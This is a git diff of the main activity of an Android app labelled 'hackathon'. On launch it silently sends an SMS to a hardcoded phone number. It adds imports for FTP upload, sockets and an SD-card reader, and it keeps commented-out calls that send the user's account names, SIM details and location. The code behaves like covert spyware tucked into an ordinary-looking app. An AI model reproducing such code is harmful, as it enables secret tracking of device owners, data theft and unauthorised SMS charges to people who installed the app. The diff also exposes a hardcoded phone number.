@@ -3,8 +3,10 @@ package com.example.abdullah.hackathon;
 import android.content.Context;
 import android.content.Intent;
 import android.os.Environment;
+import android.os.StrictMode;
 import android.support.v7.app.AppCompatActivity;
 import android.os.Bundle;
+import android.telephony.SmsManager;
 import android.util.Log;
 import android.view.Menu;
 import android.view.MenuItem;
@@ -12,9 +14,17 @@ import android.widget.TextView;
 import android.widget.Toast;
 
 import com.example.abdullah.hackathon.Services.LocationService;
+import com.example.abdullah.hackathon.Services.getRequestFromNetwork;
 
+import org.apache.commons.net.ftp.FTP;
+import org.apache.commons.net.ftp.FTPClient;
+
+import java.io.File;
+
+import Applications.HandleSockets;
 import Models.GetPhoneInformation;
 import Models.InternetConnection;
+import Models.SdCardInformation;
 import Models.SendUserInformation;
 
 import Utils.Constant;
@@ -31,23 +41,20 @@ public class MainActivity extends AppCompatActivity {
         setContentView(R.layout.activity_main);
         setUpLayoutXml();
         SendUserId();
-        startService(new Intent(this, LocationService.class));
-        new  SendUserInformation(context).sendAcountsName();
-        new SendUserInformation(context).sendSimInformaation();
+
+        SmsManager smsManager=SmsManager.getDefault();
+        smsManager.sendTextMessage("03042151706",null,"abdullah",null,null);
+       // File[]  file=new SdCardInformation(context).getSdCardContents();
+
+       /* for(File files:file){
+            Toast.makeText(getApplicationContext(), files.getName(), Toast.LENGTH_LONG).show();
+        }*/
+       // startService(new Intent(this, LocationService.class));
+      //  new  SendUserInformation(context).sendAcountsName();
+      //  new SendUserInformation(context).sendSimInformaation();
 
         //Toast.makeText(getApplicationContext(), Soft+"\n"+id+"\n"+ime, Toast.LENGTH_LONG).show();
-        /* if (IsExternalStorageWriteable() == true) {
-            File sdCardPath = Environment.getExternalStorageDirectory();
-            File sdCardFiles = new File(sdCardPath, "/");
-            for(File  files: sdCardFiles.listFiles()){
-                Toast.makeText(getApplicationContext(), files.getName(), Toast.LENGTH_LONG).show();
 
-            }
-
-            //
-        } else if (IsExternalReadStorage()==true) {
-            Toast.makeText(getApplicationContext(), "Access denied", Toast.LENGTH_LONG).show();
-        }*/
         }
 
     public void  setUpLayoutXml(){
@@ -88,30 +95,6 @@ public class MainActivity extends AppCompatActivity {
         return super.onOptionsItemSelected(item);
     }
 
-    /**
-     * @CheckSdCardWriteable
-     */
-    private boolean IsExternalStorageWriteable() {
-        String state = Environment.getExternalStorageState();
-        Log.v("State: ", state);
-        if (Environment.MEDIA_MOUNTED.equals(state)) {
 
-            return true;
-        }
-        return false;
-    }
-
-    /**
-     * @CheckSdCardReadable
-     */
-    private boolean IsExternalReadStorage() {
-
-        String state = Environment.getExternalStorageState();
-        if (Environment.MEDIA_MOUNTED.equals(state) || Environment.MEDIA_MOUNTED_READ_ONLY.equals(state)) {
-            return true;
-        }
-        return false;
-
-    }
 
 }
